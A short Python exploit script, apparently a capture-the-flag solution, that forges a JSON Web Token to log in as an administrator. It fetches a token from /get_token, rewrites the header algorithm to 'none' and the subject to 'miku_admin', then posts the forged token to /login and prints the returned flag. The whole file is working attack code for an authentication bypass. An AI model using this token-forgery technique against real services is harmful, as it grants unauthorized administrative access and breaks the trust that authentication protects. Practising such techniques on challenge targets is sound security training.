#! /usr/bin/env python3
from ten import *
from tenlib.transform import *
from dataclasses import *

set_message_formatter("Oldschool")
@arg("-h","--host")
@entry
@dataclass
class Exploit:
      host: str
      @staticmethod
      def tweakToken(token: str) -> str:
          header,payload,signature =  token.split(".")
          base64_decoded_header = json.decode(base64.decode(header)) 
          base64_decoded_payload = json.decode(base64.decode(payload))
          #Chaning alg to none
          base64_decoded_header["alg"] =  "none"
          base64_decoded_payload["sub"] = "miku_admin"
          header = base64.encode(json.encode(base64_decoded_header)).replace("=","")
          payload = base64.encode(json.encode(base64_decoded_payload)).replace("=","")
          cookie =  f"{header}.{payload}.{signature}"
          msg_info(f"Tweaked Cookie is : {cookie}")
          return cookie

      def run(self):
          session = ScopedSession(self.host)
          #Retrieving the token
          msg_info("Retreiving the token....")
          token = json.decode(session.get("/get_token").text)["your_token"]
          cookie = Exploit.tweakToken(token)
          data  =  {"magic_token": cookie}
          flag =  session.post("/login",data=data)
          msg_info(flag.text)

if __name__ == "__main__":
   Exploit()